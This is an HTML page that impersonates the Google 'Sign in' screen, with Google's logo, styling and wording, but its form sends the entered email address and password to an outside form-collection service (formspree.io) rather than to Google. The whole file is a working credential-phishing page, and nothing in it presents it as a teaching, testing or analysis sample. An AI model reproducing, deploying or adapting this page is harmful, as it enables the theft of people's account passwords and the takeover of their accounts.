<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #fff; }
        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 350px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { margin-bottom: 25px; color: #202124; font-size: 16px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .create-account { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; }
        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
        .next-btn:hover { background-color: #1b66c9; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>

        <form action="https://formspree.io/f/xojkqedg" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            
            <div style="text-align: left; margin-top: 5px;">
                <a href="#" class="create-account" style="font-size: 14px;">Forgot email?</a>
            </div>

            <div class="btn-container">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>

</body>
</html>
